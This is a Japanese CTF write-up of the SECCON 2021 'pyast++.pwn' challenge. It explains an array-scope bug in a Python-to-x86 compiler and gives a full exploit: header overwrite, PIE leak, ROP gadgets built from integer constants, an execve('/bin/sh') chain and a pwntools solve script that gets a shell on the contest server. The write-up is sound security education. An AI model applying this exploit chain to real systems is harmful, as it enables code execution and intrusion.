---
layout: page
title: "SECCON2021 pwn / pyast++.pwn"
date: 2021-12-13 00:00:00 -0000
---

pwn1問解いて、rev1問手伝って終わりました。

# pyast++.pwn
この問題のテーマはpythonで書かれた、pythonコードをx86-64アセンブリにコンパイルするソフトです。元ネタはこちら http://benhoyt.com/writings/pyast64/

時間内に解けなかったので、ゆっくり解きなおしました。

実際の問題は少し変更があります。python3.9用の対応をやったり細かい部分の修正がありますが、一番大きなのは`array`周りの追加と変更です。要素へのOOBアクセスができなくなっています。

配列は1つ64ビットのサイズで作られ、配列長が4バイト、canaryの後半4バイトでヘッダが作られます。そのあと使用するスタックを０で埋めます。

```python
    def builtin_array(self, args):
        """FIXED: Nov 20th, 2021
        The original design of `array` was vulnerable to out-of-bounds access
        and type confusion. The fixed version of the array has its length
        to prevent out-of-bounds access.

        i.e. x=array(1)
         0        4        8        16
         +--------+--------+--------+
         | length |  type  |  x[0]  |
         +--------+--------+--------+

        The `type` field is used to check if the variable is actually an array.
        This value is not guessable.
        """
        assert len(args) == 1, 'array(len) expected 1 arg, not {}'.format(len(args))
        self.visit(args[0])
        # Array length must be within [0, 0xffff]
        self.asm.instr('popq', '%rax')
        self.asm.instr('cmpq', '$0xffff', '%rax')
        self.asm.instr('ja', 'trap')
        # Allocate array on stack, add size to _array_size
        self.asm.instr('movq', '%rax', '%rcx')
        self.asm.instr('addq', '$1', '%rax')
        self.asm.instr('shlq', '$3', '%rax')
        offset = self.local_offset('_array_size')
        self.asm.instr('addq', '%rax', '{}(%rbp)'.format(offset))
        self.asm.instr('subq', '%rax', '%rsp')
        self.asm.instr('movq', '%rsp', '%rax')
        self.asm.instr('movq', '%rax', '%rbx')
        # Store the array length
        self.asm.instr('mov', '%ecx', '(%rax)')
        self.asm.instr('movq', '%fs:0x2c', '%rdx')
        self.asm.instr('mov', '%edx', '4(%rax)')
        # Fill the buffer with 0x00
        self.asm.instr('lea', '8(%rax)', '%rdi')
        self.asm.instr('xor', '%eax', '%eax')
        self.asm.instr('rep', 'stosq')
        # Push address
        self.asm.instr('pushq', '%rbx')
```

配列の参照や代入の部分にもこれに合わせた変更があります。canaryの値を確認し、配列長を確認し、範囲内であれば値の参照、代入を行います。

```python
    def visit_Assign(self, node):
        # Only supports assignment of (a single) local variable
        assert len(node.targets) == 1, \
            'can only assign one variable at a time'
        self.visit(node.value)
        target = node.targets[0]
        if isinstance(target, ast.Subscript):
            # array[offset] = value
            self.visit(target.slice) # Modified for Python 3.9
            self.asm.instr('popq', '%rax')
            self.asm.instr('popq', '%rbx')
            local_offset = self.local_offset(target.value.id)
            self.asm.instr('movq', '{}(%rbp)'.format(local_offset), '%rdx')
            # Make sure the target variable is array
            self.asm.instr('mov', '4(%rdx)', '%edi')
            self.asm.instr('mov', '%fs:0x2c', '%esi')
            self.asm.instr('cmp', '%edi', '%esi')
            self.asm.instr('jnz', 'trap')
            # Bounds checking
            self.asm.instr('mov', '(%rdx)', '%ecx')
            self.asm.instr('cmpq', '%rax', '%rcx')
            self.asm.instr('jbe', 'trap')
            # Store the element
            self.asm.instr('movq', '%rbx', '8(%rdx,%rax,8)')
        else:
            # variable = value
            offset = self.local_offset(node.targets[0].id)
            self.asm.instr('popq', '{}(%rbp)'.format(offset))
```

こちらが参照。

```python
    def visit_Subscript(self, node):
        self.visit(node.slice) # Modified for Python 3.9
        self.asm.instr('popq', '%rax')
        local_offset = self.local_offset(node.value.id)
        self.asm.instr('movq', '{}(%rbp)'.format(local_offset), '%rdx')
        # Make sure the target variable is array
        self.asm.instr('mov', '4(%rdx)', '%edi')
        self.asm.instr('mov', '%fs:0x2c', '%esi')
        self.asm.instr('cmp', '%edi', '%esi')
        self.asm.instr('jnz', 'trap')
        # Bounds checking
        self.asm.instr('mov', '(%rdx)', '%ecx')
        self.asm.instr('cmpq', '%rax', '%rcx')
        self.asm.instr('jbe', 'trap')
        # Load the element
        self.asm.instr('pushq', '8(%rdx,%rax,8)')
```

つまり`a=array(10)`で配列を作った後に`a[-1]`や`a[10]`にはアクセスできず、TRAPが発行されて実行が止まってしまいます。

また表示と入力に`putc`, `getc`が存在しますが、どちらもassignで64ビット整数中の8ビットに入力、出力をするものになってしまい、まともに使えるようには見えません。rbpを1つずつずらせるようなバグがあるのかなと思っていました。

```python
    def compile_putc(self):
        # Insert this into every program so it can call putc() for output
        self.asm.label('putc')
        self.compile_enter()
        self.asm.instr('movl', '$1', '%eax')            # write (for Linux)
        self.asm.instr('movl', '$1', '%edi')            # stdout
        self.asm.instr('movq', '%rbp', '%rsi')          # address
        self.asm.instr('addq', '$16', '%rsi')
        self.asm.instr('movq', '$1', '%rdx')            # length
        self.asm.instr('syscall')
        self.compile_return(has_arrays=False)

    def compile_getc(self):
        # Insert this into every program so it can call getc() for input
        self.asm.label('getc')
        self.compile_enter()
        self.asm.instr('xor', '%eax', '%eax')           # read (for Linux)
        self.asm.instr('xor', '%edi', '%edi')           # stdin
        self.asm.instr('lea', '-1(%rbp)', '%rsi')       # address
        self.asm.instr('movq', '$1', '%rdx')            # length
        self.asm.instr('syscall')
        self.asm.instr('movb', '-1(%rbp)', '%al')       # address
        self.compile_return(has_arrays=False)
```

競技時間中１つだけ気づいたことは、`a=array(10)`のあと、`putc(a)`とやると、配列のアドレスをさしていることに気づきました。`a += 1`などとやると配列のアドレスを変更することができます。これを利用しながらputc、getcでちまちま読み書きするのかと思いましたが、どちらにしてもチャンクのヘッダがそろっていないと何もできず、そのままでは使えません。ここで時間切れでした。

想定解は配列のスコープの考慮がないことでした。これがあまり理解できていなかったので少し詳しく書きます。

まず配列を確保する関数を用意します。この関数では、関数のスコープ内で配列を定義し、それを関数外に返します。返された先ではポインタを保持しますが、次にもう一度関数が呼ばれたときは、前に作成したチャンクのことなど知らないため、再び同じような位置に配列を作って返します。

つまり、例えば大きなサイズで配列を作成した後に、小さなサイズで配列を作成すると、先に作成した配列の中に、小さな配列のヘッダが入ってしまいます。

```python
def gen_array(size):
    x = array(size)
    return x

def exp():
    a0 = gen_array(10)
    a1 = gen_array(3)

def main():
    exp()
```

例えばこのサイズなら、`a0[6]`にアクセスすると、`a1`の配列長を伸ばせそうです。

今回のプログラムでは`/tmp`でファイルを作ってコンパイル、実行したら消すという動作だったので、デバッグ用に問題プログラムを改造します。

```diff
641a642
>     '''
647a649
>     '''
650c652
<             urllib.request.urlopen(url) as fpy
---
>             # urllib.request.urlopen(url) as fpy
652c654,657
<         code = fpy.read().decode("utf-8")
---
>         # code = fpy.read().decode("utf-8")
>         with open('./test.txt', 'r') as f:
>             code = f.read()
> 
663a669
>         subprocess.run(["cp", fasm.name, "/home/ctf/seccon2021/pyast/generated"])
669a676
>         subprocess.run(["cp", fasm.name + ".elf", "/home/ctf/seccon2021/pyast/generated.elf"])
```

これで`generated.elf`をgdbに入れてデバッグできます。配列`a1`が伸びているのが分かります。

```
0x00007fffffffdf70│+0x0060: 0x00007fffffffdf78 ← a0へのポインタ
0x00007fffffffdf78│+0x0068: 0xe61aabac0000000a ← a0のヘッダ
0x00007fffffffdf80│+0x0070: 0x0000000000000000 ← a0[0]
0x00007fffffffdf88│+0x0078: 0x0000000000000000 ← a0[1]
0x00007fffffffdf90│+0x0080: 0x0000000000000000 ← a0[2]
0x00007fffffffdf98│+0x0088: 0x0000000000000000 ← a0[3]
0x00007fffffffdfa0│+0x0090: 0x0000000000000000 ← a0[4]
0x00007fffffffdfa8│+0x0098: 0x00007fffffffdfb0 ← a0[5] かつ a1へのポインタ
0x00007fffffffdfb0│+0x00a0: 0xe61aabac00000003 ← a0[6] かつa1のヘッダ
0x00007fffffffdfb8│+0x00a8: 0x0000000000000000 ← a0[7]
0x00007fffffffdfc0│+0x00b0: 0x0000000000000000 ← a0[8]
0x00007fffffffdfc8│+0x00b8: 0x0000000000000000 ← a0[9]
0x00007fffffffdfd0│+0x00c0: 0x00007fffffffdff8
0x00007fffffffdfd8│+0x00c8: 0x0000000000000020
0x00007fffffffdfe0│+0x00d0: 0x00007fffffffdfb0
0x00007fffffffdfe8│+0x00d8: 0x000055555555507b ← 2度目のgen_array からの戻りアドレス
0x00007fffffffdff0│+0x00e0: 0x00007fffffffdfb0
0x00007fffffffdff8│+0x00e8: 0x00007fffffffe018
0x00007fffffffe000│+0x00f0: 0x00007fffffffdfb0
0x00007fffffffe008│+0x00f8: 0x00007fffffffdf78
0x00007fffffffe010│+0x0100: 0x0000555555555093 ← exp からの戻りアドレス
```

伸ばして書き戻し、適当に範囲外のアドレスを読んでみます。この時`a0[6] += 3`などとやると、AugAssignの方に処理が行き、そこでは配列がサポートされていないのでTRAPされてしまいます。
 
```python
def gen_array(size):
    x = array(size)
    return x

def exp():
    a0 = gen_array(10)
    a1 = gen_array(3)
    a1_header = a0[6]
    a1_header += 0xbeef
    a0[6] = a1_header
    test = a1[100]

def main():
    exp()
```

無事TRAPされずに値を抜けました。注目は、stdoutにリークされなくても、値さえコピーできていれば、加算するだけで正しく合う配列にすることができるという点です。この発想は無かったです。

```
0x00007fffffffdf60│+0x0050: 0x00007fffffffdf68  →  0x1d52ce120000000a
0x00007fffffffdf68│+0x0058: 0x1d52ce120000000a ← 配列a0
0x00007fffffffdf70│+0x0060: 0x0000000000000000
0x00007fffffffdf78│+0x0068: 0x0000000000000000
0x00007fffffffdf80│+0x0070: 0x0000000000000000
0x00007fffffffdf88│+0x0078: 0x0000000000000000
0x00007fffffffdf90│+0x0080: 0x0000000000000000
0x00007fffffffdf98│+0x0088: 0x00007fffffffdfa0  →  0x1d52ce120000bef2
0x00007fffffffdfa0│+0x0090: 0x1d52ce120000bef2 ← 配列a1。長さが大きい
0x00007fffffffdfa8│+0x0098: 0x0000000000000000
0x00007fffffffdfb0│+0x00a0: 0x0000000000000000
0x00007fffffffdfb8│+0x00a8: 0x0000000000000000
0x00007fffffffdfc0│+0x00b0: 0x00007fffffffdfe8  →  0x00007fffffffe018  →  0x0000000000000000
0x00007fffffffdfc8│+0x00b8: 0x0000000000000020
0x00007fffffffdfd0│+0x00c0: 0x00007fffffffdfa0  →  0x1d52ce120000bef2
0x00007fffffffdfd8│+0x00c8: 0x0000000000000006
0x00007fffffffdfe0│+0x00d0: 0x0000000000000019
0x00007fffffffdfe8│+0x00d8: 0x00007fffffffe018  →  0x0000000000000000
0x00007fffffffdff0│+0x00e0: 0x0000000000000019 ← testの値
0x00007fffffffdff8│+0x00e8: 0x1d52ce120000bef2
0x00007fffffffe000│+0x00f0: 0x00007fffffffdfa0  →  0x1d52ce120000bef2
0x00007fffffffe008│+0x00f8: 0x00007fffffffdf68  →  0x1d52ce120000000a
0x00007fffffffe010│+0x0100: 0x0000555555555126  →  <_start+9> push rax
```

これで`a1[14]`にアクセスすると、pieの値が抜き出せます。抜けますが、その先が困ります。exp関数から抜ける時を狙いたいのでROPですが、libcはロードされないので、ガジェットで困ります。小さいプログラムなので当たり前ですが。

これは割とすんなり思いつきましたが、無ければ作ればよいだけです。`x=0xc35f`と入れるだけでガジェットは生成できます。mov命令の中に`5f c3`が埋まり、このアドレスから処理を始めれば`pop rdi;ret;`と解釈されるようになります。

作成時の他の注意点として、コードが伸びるとスタックの大きさが変わるので、変数をすべて用意した後（もしくは変数を使わない）でコンパイルし、ガジェットアドレスを求めます。戻りアドレスやガジェットがズレるのが面倒なので、`main`や`gadgets`はこの時点で上に置いて固定します。`a1[14]`にあった戻りアドレスはこの変更でスタックが伸び、`a1[18]`に移動しているのでこれもgdbで見ながら合わせます。

```python
def main():
    exp()

def gadgets():
    rdx = 0xc35a            # pop rdx;ret
    rax = 0xc358            # pop rax;ret
    rdi = 0xc35f            # pop rdi;ret
    rsi = 0xc35e            # pop rsi;ret
    syscall = 0xc3050f      # syacall;ret    

def gen_array(size):
    x = array(size)
    return x

def exp():
    a0 = gen_array(10)
    a1 = gen_array(3)
    a1_header = a0[6]
    a1_header += 0xbeef
    a0[6] = a1_header
    pie = a1[18] - 0x1009
    rdi = pie + 0x0000101f
    rsi = pie + 0x00001027
    rdx = pie + 0x0000100f
    rax = pie + 0x00001017
    syscall = pie + 0x0000102f
    a1[18] = 0xdead
```

ripが0xdeadで止まれば成功です。あとはROPを作るだけです。`push`命令で4バイトより大きい値を入れられないため、`/bin/sh\x00`の文字列を作るのに一工夫いります。工夫の仕方を知らないのでreadを使いましたが、普通に計算できるようです。ありがとう想定解。最後は以下のようなコードになりました。

```python
def main():
    exp()

def gadgets():
    rdx = 0xc35a            # pop rdx;ret
    rax = 0xc358            # pop rax;ret
    rdi = 0xc35f            # pop rdi;ret
    rsi = 0xc35e            # pop rsi;ret
    syscall = 0xc3050f      # syacall;ret    

def gen_array(size):
    x = array(size)
    return x

def exp():
    a0 = gen_array(10)
    a1 = gen_array(3)
    a1_header = a0[6]
    a1_header += 0xbeef
    a0[6] = a1_header
    pie = a1[18] - 0x1009
    rdi = pie + 0x00001036
    rsi = pie + 0x0000103e
    rdx = pie + 0x00001026
    rax = pie + 0x0000102e
    syscall = pie + 0x00001046
    
    a1_header = a0[5]
    a1[18+0] = rdi
    a1[18+1] = 0
    a1[18+2] = rsi
    a1[18+3] = a1_header
    a1[18+4] = rdx
    a1[18+5] = 8
    a1[18+6] = rax
    a1[18+7] = 0
    a1[18+8] = syscall
    a1[18+9] = rdi
    a1[18+10] = a1_header
    a1[18+11] = rsi
    a1[18+12] = 0
    a1[18+13] = rdx
    a1[18+14] = 0
    a1[18+15] = rax
    a1[18+16] = 0x3b
    a1[18+17] = syscall    
    a1[18+18] = 0xdead

```

あとはシンプルなスクリプトを書いて、完了です。

```python
$ cat solve.py 
from pwn import *

TARGET = './generated.elf'
HOST = 'hiyoko.quals.seccon.jp'
PORT = 9064

def start():
        if not args.R:
                return process(TARGET)
        else:
                return remote(HOST, PORT)

r = start()
if args.R:
        r.sendlineafter(': ', 'https://transfer.sh/rD6s1Y/test.txt')
r.send('/bin/sh\x00')

r.interactive()
r.close()
```

```
$ python solve.py R
[+] Opening connection to hiyoko.quals.seccon.jp on port 9064: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ ls home
pwn
$ ls home/pwn
flag-9d2df79e282c5945194401dc3b0fe8a4.txt
pyast64.py
$ cat home/pwn/f*
SECCON{Please DM ptr-yudai if U solved this without array}
$ 
```

問題ソースの量やきれいに隠れたバグ、解決方法などおもしろかったです。
